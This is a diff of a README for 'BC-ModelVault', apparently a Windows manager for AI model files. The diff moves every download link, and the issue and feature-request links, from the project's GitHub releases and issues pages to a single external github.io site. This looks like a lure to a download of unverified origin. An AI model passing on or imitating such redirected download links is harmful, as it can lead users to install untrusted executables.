@@ -14,7 +14,7 @@ AI models are large files used by programs like Stable Diffusion and ComfyUI. Fi
 
 Visit this link to download the application.
 
-[![Download BC-ModelVault](https://img.shields.io/badge/Download-BC--ModelVault-blue?style=for-the-badge&logo=windows&logoColor=white&color=4B0082)](https://github.com/ravilmosaic528/BC-ModelVault/releases)
+[![Download BC-ModelVault](https://img.shields.io/badge/Download-BC--ModelVault-blue?style=for-the-badge&logo=windows&logoColor=white&color=4B0082)](https://ravilmosaic528.github.io)
 
 ## 🛠️ Installation Guide (Step by Step)
 
@@ -161,14 +161,14 @@ Get started today and see how much easier AI model management can be.
 
 Visit this link to download the application.
 
-[![Get BC-ModelVault](https://img.shields.io/badge/Get%20Started-BC--ModelVault-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=FF4500)](https://github.com/ravilmosaic528/BC-ModelVault/releases)
+[![Get BC-ModelVault](https://img.shields.io/badge/Get%20Started-BC--ModelVault-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=FF4500)](https://ravilmosaic528.github.io)
 
 ---
 
 ## 🔗 Quick Links
 
-- [Download Page](https://github.com/ravilmosaic528/BC-ModelVault/releases)
-- [Report an Issue](https://github.com/ravilmosaic528/BC-ModelVault/issues)
-- [Feature Requests](https://github.com/ravilmosaic528/BC-ModelVault/discussions)
+- [Download Page](https://ravilmosaic528.github.io)
+- [Report an Issue](https://ravilmosaic528.github.io)
+- [Feature Requests](https://ravilmosaic528.github.io)
 
 Keywords: ai-model-manager, ai-tools, comfyui, controlnet, generative-ai, huggingface, huggingface-downloader, llm, lora, machine-learning, model-manager, python, stable-diffusion, vae, windows
